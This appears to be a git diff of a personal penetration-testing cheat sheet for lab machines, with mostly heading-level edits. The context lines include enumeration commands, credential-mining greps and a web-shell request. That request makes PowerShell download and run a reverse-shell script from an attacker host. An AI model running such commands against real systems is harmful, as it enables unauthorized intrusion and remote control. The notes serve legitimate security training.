@@ -1,5 +1,5 @@
 # Web Apps
-## Enumeration
+### Enumeration
 Subdirectory brute force:
 `gobuster dir -u http://$IP -f -w /usr/share/wordlists/dirb/big.txt -b 400,401,404,500 -x php,sh,txt,cgi,html,js,css | tee gobuster.txt`
 
@@ -8,6 +8,7 @@ Subdirectory brute force:
 nmap default scripts for http:
 `sudo nmap -Pn -p 80 -sC 192.168.120.108` 
 
+Nikto scan:
 `nikto -h "http://$IP" | tee nikto.log` 
 
 Subdomain brute force:
@@ -49,7 +50,7 @@ http://10.10.10.15/0xdf.txt - the file to move
 ```
 `curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt` 
 
-## Resources
+### Resources
 [SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 [SQL Injection Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
@@ -94,7 +95,7 @@ http://10.10.10.15/0xdf.txt - the file to move
 
 # Linux
 
-## Shells 
+### Shells 
 [Escape restricted shell rshell](https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/)
 
 [Reverse shell stabilization deep dive video](https://www.youtube.com/watch?v=DqE6DxqJg8Q)
@@ -116,7 +117,7 @@ reset: unknown terminal type unknown
 Terminal type? screen
 ``` 
 
-## Misconfig/Vulnerability specific commands 
+### Misconfig/Vulnerability specific commands 
 [VSFTd 2.3.4 exploit](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)
 
 [Samba username map script exploit](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#samba-exploit)
@@ -124,7 +125,7 @@ Terminal type? screen
 ### nmap scan for shellshock
 `nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56`
 
-## PrivEsc
+### Linux PrivEsc
 [GTFOBins for unix binaries for privesc and other bypasses](https://gtfobins.github.io/)
 
 [/etc/shadow and passwd file formats](https://www.cyberciti.biz/faq/understanding-etcshadow-file/#:~:text=The%20%2Fetc%2Fshadow%20is%20a,only%20to%20the%20root%20user.)
@@ -142,7 +143,7 @@ Terminal type? screen
 ------------------------------------------
 # Windows 
 
-## Crackmapexec
+### Crackmapexec
 https://wiki.porchetta.industries/
 
 `crackmapexec smb 10.10.10.161 -u '' -p ''`
@@ -153,7 +154,7 @@ https://wiki.porchetta.industries/
 
 `crackmapexec smb 10.10.10.161 --groups`
 
-## Misconfig/Vulnerability specific commands 
+### Misconfig/Vulnerability specific commands 
 [Pre-Compiled Windows Exploits for common vulns](https://github.com/abatchy17/WindowsExploits)
 
 [How to exploit MS16-032](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
@@ -175,7 +176,7 @@ https://wiki.porchetta.industries/
 [Mount and extract password hashes from VHD Files](https://vk9-sec.com/mount-extract-password-hashes-from-vhd-files/)
 
 
-## Shells and Remote access 
+### Shells and Remote access 
 [Nishang PowerShell pentesting framework (Payloads, shells, etc)](https://github.com/samratashok/nishang)
 
 [Invoke-Powershelltcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
@@ -204,8 +205,8 @@ Start python3 -m http.server 80 in that same directory
 Start nc -lnvp 443
 Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/Invoke-PowerShellTcp.ps1%27)
 ``` 
---------------------------------------------
-## PrivEsc
+
+### Windows PrivEsc
 [Windows PrivEsc Tokens SEImpersonate SEAssign whoami /priv](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
 
 [living off the land binaries lolbas](https://lolbas-project.github.io/)
@@ -287,7 +288,7 @@ Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net
 ### use key for ssh
 `ssh -i key-file user@10.10.10.17` 
 
-## SSH using specific algorithm
+### SSH using specific algorithm
 `ssh -o KexAlgorithms=[ALGORITHM] [USERNAME]@[SERVER]`
 `EX: ssh -o KexAlgorithms=diffie-hellman-group1-sha1 atmail@atmail`
 USE CASE:
@@ -296,12 +297,12 @@ USE CASE:
 
 --------------------------------------------------
 # Passwords
-## Brute Force
+### Brute Force
 [FTP creds to try](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)
 
 [Brute Force password protected PDF](https://ourcodeworld.com/articles/read/939/how-to-crack-a-pdf-password-with-brute-force-using-john-the-ripper-in-kali-linux)
 
-## Password Mining
+### Password Mining
 ### grep for a string in a dir of files bash 
 `grep -ls 'pass' ${PWD}/* `
 
@@ -315,7 +316,7 @@ USE CASE:
 `dir /a:h`
 `dir /a:d` 
 
-## Password Cracking
+### Password Cracking
 ### Hashcat 
 [Hashcat Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
@@ -326,7 +327,7 @@ USE CASE:
 
 ---------------------------------------------------
 # Active Directory 
-## Resources
+### Resources
 [AD PayloadAlltheThings Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
 
 [Windows and AD cheatsheet by command WADComs](https://wadcoms.github.io/)
